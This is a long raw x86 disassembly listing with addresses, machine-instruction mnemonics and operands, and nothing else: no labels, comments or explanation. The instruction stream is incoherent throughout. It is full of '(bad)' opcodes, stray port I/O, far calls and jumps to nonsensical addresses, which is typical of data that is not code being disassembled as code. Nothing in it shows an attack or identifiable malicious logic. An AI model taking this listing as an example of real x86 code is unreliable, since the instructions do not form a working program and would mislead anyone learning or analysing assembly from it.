  49fc51:	xor    al,0x7d
  49fc53:	jo     0x49fbdf
  49fc55:	call   FWORD PTR [ebx-0x65]
  49fc58:	into   
  49fc59:	xchg   DWORD PTR [esi],esi
  49fc5b:	das    
  49fc5c:	xchg   al,ah
  49fc5e:	das    
  49fc5f:	dec    esi
  49fc60:	add    al,0xfe
  49fc62:	push   esi
  49fc63:	push   edi
  49fc64:	outs   dx,DWORD PTR ds:[esi]
  49fc65:	mov    dh,0xd3
  49fc67:	mov    eax,ds:0x2021da7
  49fc6c:	dec    edi
  49fc6d:	(bad)  
  49fc6f:	out    dx,al
  49fc70:	loopne 0x49fbff
  49fc72:	xor    dl,0xb4
  49fc75:	(bad)  
  49fc77:	lea    ecx,[ebp+0x5ac03a1e]
  49fc7d:	dec    edx
  49fc7e:	std    
  49fc7f:	jo     0x49fc0d
  49fc81:	call   FWORD PTR [esi+ebx*4-0x45]
  49fc85:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  49fc87:	aaa    
  49fc88:	add    dl,BYTE PTR [ebp-0x526096b]
  49fc8e:	test   DWORD PTR [esi],ebx
  49fc90:	jno    0x49fc4b
  49fc92:	xlat   BYTE PTR ds:[ebx]
  49fc93:	or     ch,0x23
  49fc96:	pusha  
  49fc97:	dec    DWORD PTR [esi+ebx*8-0x24001d72]
  49fc9e:	imul   ebp,DWORD PTR [edx],0xfee5e3be
  49fca4:	pop    edx
  49fca5:	xchg   ebp,eax
  49fca6:	lods   al,BYTE PTR ds:[esi]
  49fca7:	(bad)  
  49fca8:	cmp    esi,DWORD PTR [eax+edx*4-0x1]
  49fcac:	pop    esi
  49fcad:	mov    eax,ds:0x8b812fe6
  49fcb2:	mov    esi,0xdb77fe36
  49fcb7:	std    
  49fcb8:	dec    DWORD PTR [edx-0x7409fdea]
  49fcbe:	xchg   DWORD PTR [esi],edx
  49fcc0:	jae    0x49fc7f
  49fcc2:	(bad)  [eax+0x3ac6eeff]
  49fcc8:	das    
  49fcc9:	cmp    ch,0x37
  49fccc:	out    0x46,al
  49fcce:	fadd   st,st(1)
  49fcd0:	neg    ah
  49fcd2:	(bad)  
  49fcd3:	pop    esp
  49fcd4:	xchg   esi,eax
  49fcd5:	scas   eax,DWORD PTR es:[edi]
  49fcd6:	(bad)  
  49fcd7:	push   cs
  49fcd8:	pushf  
  49fcd9:	mov    eax,0x8047ffe7
  49fcde:	jl     0x49fcc5
  49fce0:	fdivp  st(1),st
  49fce2:	push   DWORD PTR [esi-0x40]
  49fce5:	ficom  WORD PTR [ecx-0x6557fe06]
  49fceb:	out    0x92,eax
  49fced:	xor    al,0x4f
  49fcef:	jmp    0x49fca2
  49fcf1:	jecxz  0x49fc7c
  49fcf3:	(bad)  
  49fcf4:	mov    esi,0x8d723aff
  49fcf9:	into   
  49fcfa:	mov    bl,0xd3
  49fcfc:	jmp    0x27ba2ebc
  49fd01:	jle    0x49fd01
  49fd03:	jbe    0x72cebd50
  49fd09:	jle    0x49fc99
  49fd0b:	call   DWORD PTR [ebx+0x3eb14bdb]
  49fd11:	xchg   esp,eax
  49fd12:	jmp    0x49fcda
  49fd14:	in     eax,dx
  49fd15:	(bad)  
  49fd16:	in     al,dx
  49fd17:	mov    esi,0x2759a567
  49fd1c:	jo     0x49fc9e
  49fd1e:	mov    edi,0xfcf6d4f6
  49fd23:	test   DWORD PTR [eax],0xff05bbf9
  49fd29:	inc    DWORD PTR [edi+0x7afffada]
  49fd2f:	(bad)  
  49fd30:	out    0xbd,al
  49fd32:	mov    ch,0x59
  49fd34:	(bad)  
  49fd35:	xchg   ebp,eax
  49fd36:	jmp    0x49fcfe
  49fd38:	out    dx,al
  49fd39:	dec    BYTE PTR [edi-0x6c]
  49fd3c:	xchg   ecx,eax
  49fd3d:	dec    eax
  49fd3e:	js     0x49fdbd
  49fd40:	push   es
  49fd41:	mov    fs,ebp
  49fd43:	push   cs
  49fd44:	push   cs
  49fd45:	das    
  49fd46:	out    dx,al
  49fd47:	mov    ebp,0xdeee8387
  49fd4c:	cld    
  49fd4d:	idiv   edi
  49fd4f:	push   ds
  49fd50:	push   cs
  49fd51:	add    ebx,edi
  49fd53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49fd54:	into   
  49fd55:	or     esp,0x97ffa2ec
  49fd5b:	out    dx,eax
  49fd5c:	aad    0xcd
  49fd5e:	ss mov bl,0x47
  49fd61:	hlt    
  49fd62:	neg    BYTE PTR [eax-0xb287819]
  49fd68:	into   
  49fd69:	xchg   esi,eax
  49fd6a:	xor    al,0xb7
  49fd6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49fd6d:	out    0xd8,al
  49fd6f:	inc    BYTE PTR [esi-0x5725042a]
  49fd75:	push   edi
  49fd76:	add    cl,BYTE PTR [ebx]
  49fd78:	dec    DWORD PTR [esi+0x50c7070e]
  49fd7e:	fsubr  QWORD PTR [edi+eax*1-0x40]
  49fd82:	iret   
  49fd83:	imul   dh
  49fd85:	cdq    
  49fd86:	in     eax,dx
  49fd87:	mov    ecx,ds
  49fd89:	repz mov cl,0xac
  49fd8c:	into   
  49fd8d:	add    al,dh
  49fd8f:	into   
  49fd90:	cmc    
  49fd91:	xlat   BYTE PTR ds:[ebx]
  49fd92:	jle    0x49fdce
  49fd94:	js     0x49fd94
  49fd96:	xchg   esi,esi
  49fd98:	fdiv   st(5),st
  49fd9a:	loope  0x49fd25
  49fd9c:	(bad)  
  49fd9e:	mov    eax,0x87900ea2
  49fda3:	add    cl,bh
  49fda5:	aas    
  49fda6:	(bad)  
  49fda7:	jbe    0x49fd2d
  49fda9:	aam    0xf4
  49fdab:	inc    eax
  49fdac:	jbe    0x49fd6d
  49fdae:	fld    QWORD PTR [esp+edx*4]
  49fdb1:	fdiv   st(4),st
  49fdb3:	push   DWORD PTR [edi-0x2e510f5e]
  49fdb9:	push   es
  49fdba:	mov    edi,edx
  49fdbc:	clc    
  49fdbd:	std    
  49fdbe:	xchg   ebx,eax
  49fdbf:	loop   0x49fdbe
  49fdc1:	rcl    BYTE PTR [edi-0x6461031c],1
  49fdc7:	in     eax,0xfd
  49fdc9:	jbe    0x49fd5d
  49fdcb:	xchg   DWORD PTR [edx-0x74af20ae],ecx
  49fdd1:	loop   0x49fdd1
  49fdd3:	push   cs
  49fdd4:	dec    edi
  49fdd5:	clc    
  49fdd6:	lock jmp 0x668d5c92
  49fddc:	jg     0x49fdda
  49fdde:	dec    esi
  49fddf:	lock cmp al,BYTE PTR [ebx+0x7000edc]
  49fde6:	add    esp,esp
  49fde8:	jb     0x49fe25
  49fdea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49fdeb:	sbb    ah,BYTE PTR [esi+0x1]
  49fdee:	inc    esi
  49fdef:	pop    es
  49fdf0:	add    DWORD PTR [edi-0x3fcc217a],esp
  49fdf6:	loopne 0x49fe0a
  49fdf8:	loopne 0x49fe69
  49fdfa:	lock add DWORD PTR [edx+0x73b51a1],ebp
  49fe01:	outs   dx,DWORD PTR ds:[esi]
  49fe02:	add    DWORD PTR [edx+0x404f150f],edx
  49fe08:	add    al,0x3f
  49fe0a:	and    BYTE PTR [edx-0x4b],0x33
  49fe0e:	pop    es
  49fe0f:	pop    ss
  49fe10:	jo     0x49fe6e
  49fe12:	dec    ebp
  49fe13:	inc    DWORD PTR ds:0x6effe6ec
  49fe19:	push   esi
  49fe1a:	inc    ebp
  49fe1b:	push   DWORD PTR [esi+ebx*2+0x4e]
  49fe1f:	push   DWORD PTR [edi+0x63]
  49fe22:	push   ebp
  49fe23:	je     0x49fe8a
  49fe25:	(bad)  
  49fe26:	jg     0x49fe0c
  49fe28:	xor    ch,bh
  49fe2a:	fnsave [eax]
  49fe2c:	dec    edi
  49fe2d:	mov    cl,0x9c
  49fe2f:	test   edi,edi
  49fe31:	pop    ebp
  49fe32:	jp     0x49feb2
  49fe34:	cs inc edx
  49fe36:	sub    BYTE PTR [eax+esi*8+0xb],dl
  49fe3a:	push   ds
  49fe3b:	popa   
  49fe3c:	jmp    DWORD PTR [eax+0x17ff708c]
  49fe42:	(bad)  
  49fe43:	jg     0x49fea5
  49fe45:	xor    al,0x76
  49fe47:	(bad)  
  49fe48:	mov    esi,0xff222335
  49fe4d:	pop    edi
  49fe4e:	outs   dx,BYTE PTR ds:[esi]
  49fe4f:	(bad)  
  49fe50:	dec    DWORD PTR ds:0x11ffac6f
  49fe56:	sub    BYTE PTR [edi-0x1],0xdb
  49fe5a:	jo     0x49fe1a
  49fe5c:	push   cs
  49fe5d:	ins    BYTE PTR es:[edi],dx
  49fe5e:	mov    cl,0xff
  49fe60:	push   edi
  49fe61:	jne    0x49fed2
  49fe63:	jmp    DWORD PTR [ebx]
  49fe65:	adc    eax,0x5d5aa613
  49fe6a:	jmp    DWORD PTR [ebp+eiz*2+0x17]
  49fe6e:	cmp    esp,ecx
  49fe70:	call   FWORD PTR [edi+0x2a1e1708]
  49fe76:	pop    es
  49fe77:	push   cs
  49fe78:	adc    DWORD PTR [edx],esi
  49fe7a:	or     BYTE PTR [ecx],dl
  49fe7c:	adc    al,0x32
  49fe7e:	add    BYTE PTR [ecx+0x3938a780],0xdb
  49fe85:	dec    DWORD PTR ds:0xb2ff3bd6
  49fe8b:	push   DWORD PTR [esi+ebp*1]
  49fe8e:	sub    eax,0x2b2a2fff
  49fe93:	push   DWORD PTR [edx]
  49fe95:	sub    eax,0xff22260e
  49fe9a:	into   
  49fe9b:	xchg   ebx,eax
  49fe9c:	clc    
  49fe9d:	and    edi,edi
  49fe9f:	push   ds
  49fea0:	and    BYTE PTR [ecx],ah
  49fea2:	mov    edi,0x4d197f4e
  49fea7:	arpl   WORD PTR [ecx-0x2e839e3],dx
  49fead:	cmp    al,0x77
  49feaf:	xchg   ecx,eax
  49feb0:	in     al,0x37
  49feb2:	jno    0x49fe56
  49feb4:	cmp    DWORD PTR [ebp+ecx*4-0x23],esi
  49feb8:	popa   
  49feb9:	push   esi
  49feba:	pop    ebx
  49febb:	fldz   
  49febd:	shl    dh,cl
  49febf:	pop    ebx
  49fec0:	pop    edx
  49fec1:	inc    ecx
  49fec3:	add    bh,bh
  49fec5:	leave  
  49fec6:	dec    esi
  49fec7:	enter  0xc5c6,0xe
  49fecb:	mov    esp,0xa6e66125
  49fed1:	mov    esi,0xb610c5c5
  49fed7:	jg     0x49fefc
  49fed9:	(bad)  
  49feda:	pop    eax
  49fedb:	mov    ds:0x7b632b7f,eax
  49fee0:	mov    ch,0x7f
  49fee2:	push   es
  49fee3:	jno    0x49fe9e
  49fee5:	aad    0xff
  49fee7:	jo     0x49fea0
  49fee9:	aam    0xf7
  49feeb:	mov    ebp,0xc82f7ffd
  49fef0:	(bad)  
  49fef4:	and    DWORD PTR [eax],esp
  49fef6:	inc    DWORD PTR ds:0xa09ff00
  49fefc:	or     al,BYTE PTR [edi]
  49fefe:	or     cl,BYTE PTR [esi]
  49ff00:	loop   0x49fe89
  49ff02:	std    
  49ff03:	out    0x8,al
  49ff05:	or     BYTE PTR [ecx],cl
  49ff07:	or     ecx,DWORD PTR [ebx]
  49ff09:	push   DWORD PTR [ebx+0x2c7fafae]
  49ff0f:	sub    al,0x63
  49ff11:	jl     0x49fec6
  49ff13:	or     esp,ebx
  49ff15:	inc    DWORD PTR [ebx]
  49ff17:	push   es
  49ff18:	jbe    0x49feda
  49ff1a:	fdiv   st(7),st
  49ff1c:	jne    0x49fedc
  49ff1e:	(bad)  
  49ff20:	jg     0x49ff9f
  49ff22:	jl     0x49fee3
  49ff24:	aad    0x44
  49ff26:	test   DWORD PTR [ecx-0x7b],esi
  49ff29:	test   BYTE PTR [esi+esi*4+0x61903e88],al
  49ff30:	cwde   
  49ff31:	mov    bh,dh
  49ff33:	call   DWORD PTR [eax+0x160f908f]
  49ff39:	outs   dx,DWORD PTR ds:[esi]
  49ff3a:	fwait
  49ff3b:	dec    ebx
  49ff3c:	push   esi
  49ff3d:	xchg   esi,eax
  49ff3e:	jle    0x49ff86
  49ff40:	jle    0x49ffc1
  49ff42:	and    BYTE PTR [esi+edi*2-0x4e],0x86
  49ff47:	mov    esi,0xf602b893
  49ff4c:	jnp    0x49ff15
  49ff4e:	jecxz  0x49ff6e
  49ff50:	loope  0x49ff51
  49ff52:	ins    BYTE PTR es:[edi],dx
  49ff53:	mov    dh,0xd5
  49ff55:	sbb    ch,BYTE PTR [eax+0x78]
  49ff58:	xor    edx,DWORD PTR [esi-0x63]
  49ff5b:	(bad)  
  49ff5c:	mov    edx,0xd0eb66be
  49ff61:	jg     0x49ff01
  49ff63:	mov    cl,0x24
  49ff65:	retf   0xe2b4
  49ff68:	cli    
  49ff69:	push   ebx
  49ff6b:	lock in al,dx
  49ff6d:	call   FWORD PTR [edi+0x60c0ff18]
  49ff73:	push   ds
  49ff74:	out    dx,eax
  49ff75:	cs addr16 jg 0x49ff2a
  49ff79:	mov    edi,ds
  49ff7b:	(bad)  
  49ff7c:	push   esp
  49ff7d:	adc    ah,BYTE PTR [esi]
  49ff7f:	mov    ds:0xe9eeace,al
  49ff84:	mov    edx,0x175c977f
  49ff89:	push   es
  49ff8a:	inc    ebp
  49ff8b:	sbb    BYTE PTR [ecx-0x2821d912],0xd0
  49ff92:	(bad)  
  49ff93:	cld    
  49ff94:	repz call 0x636212ff
  49ff9a:	pop    es
  49ff9b:	sahf   
  49ff9c:	jle    0x49ff3e
  49ff9e:	mov    al,ds:0x483e06f0
  49ffa3:	das    
  49ffa4:	das    
  49ffa5:	imul   edi,DWORD PTR [edi-0x53],0x62a6ef7e
  49ffac:	or     BYTE PTR [esi],ah
  49ffae:	dec    esi
  49ffaf:	aam    0x66
  49ffb1:	adc    ecx,0xece57fef
  49ffb7:	dec    esi
  49ffb8:	mov    eax,ds:0xfb67d681
  49ffbd:	lock loop 0x49ffc7
  49ffc0:	out    dx,al
  49ffc1:	fistp  QWORD PTR [eax+ecx*8+0x47]
  49ffc5:	rcl    DWORD PTR [ebp+0x2050fd98],0x6b
  49ffcc:	jg     0x49ff74
  49ffce:	or     DWORD PTR [esi],esp
  49ffd0:	cld    
  49ffd1:	or     DWORD PTR [esi-0x59072376],ecx
  49ffd7:	sub    BYTE PTR [esi-0xab183d2],0xae
  49ffde:	out    dx,al
  49ffdf:	out    dx,al
  49ffe0:	mov    dh,dh
  49ffe2:	or     esi,DWORD PTR [ebp+0x8db0c1]
  49ffe8:	scas   al,BYTE PTR es:[edi]
  49ffe9:	xchg   ebp,edi
  49ffeb:	xchg   esi,eax
  49ffec:	hlt    
  49ffed:	mov    DWORD PTR [eax],edi
  49ffef:	cmp    cl,BYTE PTR [ebp+ebp*8+0x26f38787]
  49fff6:	mov    dh,bh
  49fff8:	push   esi
  49fff9:	fistp  DWORD PTR [edi+0x60]
  49fffc:	jnp    0x49ff7f
  49fffe:	pop    ds
  49ffff:	xor    ch,BYTE PTR [ebp+0x7f]
  4a0002:	lahf   
  4a0003:	xchg   esi,eax
  4a0004:	ds loope 0x4a0003
  4a0007:	pop    esi
  4a0008:	loopne 0x4a0005
  4a000a:	mov    eax,0x36742541
  4a000f:	cli    
  4a0010:	sahf   
  4a0011:	push   ds
  4a0012:	push   esi
  4a0013:	xchg   edi,eax
  4a0014:	mov    al,0x41
  4a0016:	test   edi,edi
  4a0018:	push   es
  4a0019:	dec    edi
  4a001a:	(bad)  
  4a001b:	cmp    esi,DWORD PTR [esi-0x75]
  4a001e:	(bad)  
  4a001f:	adc    BYTE PTR [edi],bl
  4a0021:	and    al,0x2e
  4a0023:	iret   
  4a0024:	pop    esp
  4a0025:	(bad)  
  4a0026:	sahf   
  4a0027:	jg     0x4a005c
  4a0029:	outs   dx,BYTE PTR ds:[esi]
  4a002a:	jg     0x49ffc1
  4a002c:	cwde   
  4a002d:	out    dx,eax
  4a002e:	inc    BYTE PTR [edi]
  4a0030:	mov    ds,esi
  4a0032:	enter  0xa1db,0xf0
  4a0036:	jg     0x49fffe
  4a0038:	cmp    eax,0x2011c07e
  4a003d:	and    eax,0x47f19b79
  4a0042:	aaa    
  4a0043:	jb     0x49ffc7
  4a0045:	xchg   ecx,eax
  4a0046:	mov    eax,ds:0x6f099ee
  4a004b:	icebp  
  4a004c:	in     al,0xdf
  4a004e:	cld    
  4a004f:	push   ds
  4a0050:	call   0x42ed:0x967ffff2
  4a0057:	adc    BYTE PTR [ebx+0x29210dbc],0x20
  4a005e:	aas    
  4a005f:	idiv   bh
  4a0061:	and    DWORD PTR [eax+edx*2],ebx
  4a0064:	bound  edx,QWORD PTR [ebp+0x47]
  4a0067:	xchg   BYTE PTR [edx-0x6d7cbc68],dl
  4a006d:	xchg   ebp,eax
  4a006e:	pop    es
  4a006f:	test   BYTE PTR [ecx+0x141a3a95],dl
  4a0075:	loopne 0x4a0076
  4a0077:	jne    0x4a0005
  4a0079:	xchg   ebp,eax
  4a007a:	inc    ecx
  4a007b:	adc    DWORD PTR [edx+0x6b582297],0x84694f64
  4a0085:	ficom  WORD PTR [edx-0x3d07f98a]
  4a008b:	lock cmp al,0xd7
  4a008e:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4a0090:	add    BYTE PTR [ebx],0x7
  4a0093:	pop    es
  4a0094:	aas    
  4a0095:	inc    edi
  4a0096:	add    esi,DWORD PTR [edi]
  4a0098:	xchg   edi,eax
  4a0099:	jg     0x4a00bf
  4a009b:	add    eax,0x7e6a00
  4a00a0:	fild   QWORD PTR [ebp+0x276231]
  4a00a6:	xor    eax,0xb91b12b1
  4a00ab:	or     BYTE PTR [ebp-0x43034091],dl
  4a00b1:	and    eax,0xff024690
  4a00b6:	add    DWORD PTR [esi],ebx
  4a00b8:	push   es
  4a00b9:	pop    esi
  4a00ba:	std    
  4a00bb:	inc    DWORD PTR [edx]
  4a00bd:	aaa    
  4a00be:	add    al,BYTE PTR [eax+eiz*2]
  4a00c1:	or     eax,esp
  4a00c3:	adc    BYTE PTR [edi],bh
  4a00c5:	or     al,0x77
  4a00c7:	add    DWORD PTR [edx],edx
  4a00c9:	sub    cl,dl
  4a00cb:	inc    DWORD PTR [ebx]
  4a00cd:	lahf   
  4a00ce:	or     eax,0x25a81d8
  4a00d3:	mov    BYTE PTR ds:0xfb60bc07,bl
  4a00d9:	outs   dx,DWORD PTR ds:[esi]
  4a00da:	adc    BYTE PTR [esi],bl
  4a00dc:	inc    eax
  4a00dd:	or     edi,DWORD PTR [edi+0x8]
  4a00e0:	push   0xa2081301
  4a00e5:	add    esp,ecx
  4a00e7:	or     al,0x90
  4a00e9:	add    esp,ebx
  4a00eb:	jl     0x4a00a9
  4a00ed:	imul   ebp
  4a00ef:	fisttp WORD PTR ds:0x5320534d
  4a00f5:	popa   
  4a00f6:	outs   dx,BYTE PTR ds:[esi]
  4a00f7:	jae    0x4a0101
  4a00f9:	gs jb  0x4a0165
  4a00fc:	sub    bp,WORD PTR [edi+esi*1-0x56]
  4a0101:	add    edx,DWORD PTR ds:0x72bc8f9c
  4a0107:	jo     0x4a0149
  4a0109:	sbb    ah,bh
  4a010b:	or     DWORD PTR [esi+0x2e],eax
  4a010e:	xor    dh,BYTE PTR [eax+0x58]
  4a0111:	mov    BYTE PTR [edi-0x23],ch
  4a0114:	add    al,0x5
  4a0116:	and    al,0xcf
  4a0118:	mov    esp,0xdc6cc3bb
  4a011d:	sbb    ch,BYTE PTR [esi+ecx*1+0x34]
  4a0121:	lock ins BYTE PTR es:[edi],dx
  4a0123:	dec    esp
  4a0124:	cmp    DWORD PTR [esi+0x8],edi
  4a0127:	xchg   ecx,eax
  4a0128:	cld    
  4a0129:	outs   dx,DWORD PTR ds:[esi]
  4a012a:	mov    ds:0x17e872e1,eax
  4a012f:	add    BYTE PTR [esi],bl
  4a0131:	(bad)  
  4a0132:	pandn  mm0,QWORD PTR [edx]
  4a0135:	adc    dl,BYTE PTR [eax]
  4a0137:	add    eax,DWORD PTR [edx+0x6522007]
  4a013d:	sub    dh,bl
  4a013f:	call   0x16f8:0xe5654edd
  4a0146:	addr16 jo 0x4a0156
  4a0149:	add    BYTE PTR [edi],dl
  4a014b:	push   DWORD PTR [edi+0x79]
  4a014e:	push   cs
  4a014f:	or     dl,BYTE PTR [edi+0x38]
  4a0152:	pop    es
  4a0153:	jb     0x4a01c6
  4a0155:	add    eax,0x28066cf7
  4a015a:	loop   0x4a010b
  4a015c:	adc    al,0xf
  4a015e:	jo     0x4a0129
  4a0160:	cs das 
  4a0162:	and    eax,DWORD PTR [edi+0x8]
  4a0165:	ins    BYTE PTR es:[edi],dx
  4a0166:	cwde   
  4a0167:	or     eax,0x9803c009
  4a016c:	dec    eax
  4a016d:	push   ds
  4a016e:	and    esi,esi
  4a0170:	mov    dl,0x5b
  4a0172:	push   0x14a06feb
  4a0177:	or     al,0x0
  4a0179:	cmp    eax,0x187f2f2d
  4a017e:	or     ah,ch
  4a0180:	jo     0x4a01f5
  4a0182:	bound  edx,QWORD PTR [eax-0x5867dfeb]
  4a0188:	adc    edx,0x45
  4a018b:	and    ecx,DWORD PTR [ebx]
  4a018d:	push   eax
  4a018e:	sar    edi,0x8
  4a0191:	out    0x5,eax
  4a0193:	rol    BYTE PTR [edx],1
  4a0195:	shl    BYTE PTR [ecx],0xe3
  4a0198:	sbb    al,0x1c
  4a019a:	pusha  
  4a019b:	pop    ds
  4a019c:	xor    BYTE PTR [ebx+0x429ec70d],bl
  4a01a2:	sbb    BYTE PTR [ecx],al
  4a01a4:	dec    ecx
  4a01a5:	or     BYTE PTR [edi+ecx*4],0x23
  4a01a9:	and    BYTE PTR [eax],0xe
  4a01ac:	retf   
  4a01ad:	add    al,0x36
  4a01af:	mov    ah,0x19
  4a01b1:	sub    al,0x8
  4a01b3:	pop    ebp
  4a01b4:	add    dh,BYTE PTR [edx]
  4a01b6:	add    al,0x1b
  4a01b8:	mov    esp,0x44fa5379
  4a01bd:	scas   eax,DWORD PTR es:[edi]
  4a01be:	add    eax,0x291101ef
  4a01c3:	add    BYTE PTR ds:0x8502bc5b,bl
  4a01c9:	je     0x4a01f8
  4a01cb:	and    eax,0x69348da
  4a01d0:	and    BYTE PTR [eax+ebx*1-0x50],dl
  4a01d4:	jle    0x4a01d0
  4a01d6:	and    BYTE PTR [edi],bh
  4a01d8:	daa    
  4a01d9:	mov    ebp,0x6023ab0
  4a01de:	jge    0x4a0175
  4a01e0:	adc    DWORD PTR [eax],ebp
  4a01e2:	push   ss
  4a01e3:	push   edx
  4a01e4:	sbb    DWORD PTR [eax-0x6f],ebp
  4a01e7:	inc    esi
  4a01e8:	add    eax,0xdf69b272
  4a01ed:	push   ds
  4a01ee:	inc    ebx
  4a01ef:	ins    BYTE PTR es:[edi],dx
  4a01f0:	outs   dx,DWORD PTR ds:[esi]
  4a01f1:	jae    0x4a0258
  4a01f3:	mov    WORD PTR ds:0x1f1216f8,es
  4a01f9:	leave  
  4a01fa:	add    DWORD PTR [eax-0x4d],0x4
  4a01fe:	inc    esp
  4a01ff:	gs ins BYTE PTR es:[edi],dx
  4a0201:	shr    DWORD PTR [esi+esi*1-0x6b],cl
  4a0205:	gs add al,0xe0
  4a0208:	adc    BYTE PTR [edi],ah
  4a020a:	push   es
  4a020b:	or     BYTE PTR [ebp+0x145a0654],al
  4a0211:	xchg   ebx,eax
  4a0212:	inc    edi
  4a0213:	add    ebx,DWORD PTR [esi-0x6e]
  4a0216:	xchg   BYTE PTR [edi+0x6964457e],dh
  4a021c:	je     0x4a0260
  4a021e:	add    ecx,DWORD PTR [esi+0x3923f313]
  4a0224:	dec    edx
  4a0225:	add    DWORD PTR [ebx+0x61],edx
  4a0228:	jbe    0x4a028f
  4a022a:	sub    esp,esp
  4a022c:	nop
  4a022d:	dec    ebp
  4a022e:	add    DWORD PTR [eax+0x73e61105],esp
  4a0234:	enter  0x28b,0xb1
  4a0238:	or     eax,0x461f6833
  4a023d:	jb     0x4a025f
  4a023f:	iret   
  4a0240:	fild   DWORD PTR [esi]
  4a0242:	push   ds
  4a0243:	add    BYTE PTR [edx-0x7b3ef6db],cl
  4a0249:	mov    bl,BYTE PTR [edx]
  4a024b:	in     al,0x20
  4a024d:	fist   WORD PTR [ecx-0x22f96100]
  4a0253:	add    eax,eax
  4a0255:	aam    0x4e
  4a0257:	add    edi,DWORD PTR [ebx]
  4a0259:	lods   eax,DWORD PTR ds:[esi]
  4a025a:	popa   
  4a025b:	push   cs
  4a025c:	pop    es
  4a025d:	outs   dx,DWORD PTR ds:[esi]
  4a025e:	dec    ebp
  4a025f:	idiv   dh
  4a0261:	(bad)  
  4a0262:	iret   
  4a0263:	xor    BYTE PTR [edi+ebp*1],cl
  4a0266:	or     eax,0x90127268
  4a026b:	popa   
  4a026c:	xlat   BYTE PTR ds:[ebx]
  4a026d:	retf   
  4a026e:	inc    edi
  4a026f:	inc    edi
  4a0270:	pxor   mm4,QWORD PTR [ebx+0x72]
  4a0274:	dec    eax
  4a0275:	adc    dl,BYTE PTR [edi-0x61b56686]
  4a027b:	jo     0x4a0288
  4a027d:	adc    BYTE PTR [esi+0x72],dh
  4a0280:	push   esp
  4a0281:	aad    0x67
  4a0283:	ds mov bl,0x38
  4a0286:	adc    esi,DWORD PTR [ecx+0x4]
  4a0289:	mov    ebx,0xe065d83e
  4a028e:	adc    DWORD PTR [edi],eax
  4a0290:	rcr    DWORD PTR [ecx-0x78],1
  4a0293:	push   cs
  4a0294:	sbb    BYTE PTR [eax],ah
  4a0296:	aad    0x4e
  4a0298:	add    esi,DWORD PTR [ebp+0x5a]
  4a029b:	pushf  
  4a029c:	in     al,dx
  4a029d:	push   esi
  4a029e:	inc    ecx
  4a029f:	scas   eax,DWORD PTR es:[edi]
  4a02a0:	jmp    0x4a028a
  4a02a2:	pop    ss
  4a02a3:	push   es
  4a02a4:	sbb    al,0xb9
  4a02a6:	dec    esp
  4a02a7:	adc    eax,0xf07713cf
  4a02ac:	(bad)  
  4a02ae:	xor    al,0x91
  4a02b0:	pushf  
  4a02b1:	or     bh,BYTE PTR ds:0x13ac1b9c
  4a02b7:	ret    0x870a
  4a02ba:	arpl   ax,bx
  4a02bc:	or     DWORD PTR [ecx+0x26],edi
  4a02bf:	xchg   edx,eax
  4a02c0:	retf   
  4a02c1:	test   DWORD PTR [eax],0x34154700
  4a02c7:	mov    esp,0x11380d8
  4a02cc:	add    DWORD PTR [edx-0xfa0e2ad],ebp
  4a02d2:	pop    ss
  4a02d3:	jb     0x4a033a
  4a02d5:	sub    BYTE PTR fs:[edx+0x50],dl
  4a02d9:	dec    ebp
  4a02da:	sub    DWORD PTR [ebp+eax*1+0x1ab803c0],ebx
  4a02e1:	mov    ds:0x688a6fff,al
  4a02e6:	imul   ecx,DWORD PTR [esi+0x2501c827],0x33
  4a02ed:	dec    esi
  4a02ee:	mov    ss,WORD PTR [esi]
  4a02f0:	out    dx,al
  4a02f1:	fmul   st,st(6)
  4a02f3:	and    BYTE PTR [ecx],dh
  4a02f5:	lock dec ebp
  4a02f7:	outs   dx,DWORD PTR ds:[esi]
  4a02f8:	fs jb  0x4a0323
  4a02fb:	push   esp
  4a02fc:	or     bl,0xd9
  4a02ff:	pop    ds
  4a0300:	adc    BYTE PTR [eax+edx*2],ch
  4a0303:	outs   dx,DWORD PTR ds:[esi]
  4a0304:	ja     0x4a0352
  4a0306:	popf   
  4a0307:	mov    edx,0xb792263d
  4a030c:	ss pushf 
  4a030e:	es not BYTE PTR gs:[ecx+0x229d641]
  4a0316:	push   es
  4a0317:	mov    eax,ds:0x597c2c2f
  4a031c:	pop    ebx
  4a031d:	pusha  
  4a031e:	cmp    cl,BYTE PTR [edi+0x4c]
  4a0321:	inc    esp
  4a0322:	push   edx
  4a0323:	and    BYTE PTR [edx+0x1afa2964],dh
  4a0329:	or     DWORD PTR [ecx+0x203a2e73],ecx
  4a032f:	or     BYTE PTR [eax-0xd],al
  4a0332:	cld    
  4a0333:	push   esi
  4a0334:	inc    esi
  4a0336:	call   0xf669b52
  4a033b:	(bad)  
  4a033d:	add    al,BYTE PTR [ebx]
  4a033f:	adc    ecx,DWORD PTR [eax+0x27]
  4a0342:	dec    esp
  4a0343:	retf   
  4a0344:	add    al,0x44
  4a0346:	mov    ds:0x3a5b73a2,eax
  4a034b:	(bad)  
  4a034c:	aaa    
  4a034d:	aam    0x42
  4a034f:	mov    eax,0x82c9c1f
  4a0354:	in     al,dx
  4a0355:	push   esp
  4a0356:	enter  0xe819,0xf2
  4a035a:	es xchg edx,eax
  4a035c:	out    0x17,eax
  4a035e:	inc    edi
  4a035f:	add    al,0x24
  4a0361:	dec    eax
  4a0362:	mov    BYTE PTR [ecx],bl
  4a0364:	jbe    0x4a03e3
  4a0366:	(bad)  
  4a0367:	jae    0x4a039e
  4a0369:	str    WORD PTR [eax+0x6f]
  4a036d:	ins    BYTE PTR es:[edi],dx
  4a036e:	and    BYTE PTR fs:[eax],ah
  4a0371:	push   edx
  4a0372:	jo     0x4a03e8
  4a0374:	xor    BYTE PTR [ebp+0x22320c1f],bl
  4a037a:	inc    eax
  4a037b:	or     esp,DWORD PTR [edi]
  4a037d:	push   es
  4a037e:	in     al,dx
  4a037f:	add    edx,DWORD PTR [edx-0x47]
  4a0382:	and    ah,bh
  4a0384:	popw   es
  4a0386:	pop    ds
  4a0387:	mov    esp,DWORD PTR es:[ecx]
  4a038a:	xor    cl,bl
  4a038c:	inc    ebp
  4a038d:	mov    bh,0x74
  4a038f:	sub    eax,ebx
  4a0391:	mov    edx,0x5c746eda
  4a0396:	push   edi
  4a0397:	push   0x7e8b568
  4a039c:	mov    eax,ds:0x683cd9e4
  4a03a1:	add    DWORD PTR [edi+0x1ffb2214],ebp
  4a03a7:	dec    ebx
  4a03a8:	mov    edx,0x4a06cd4a
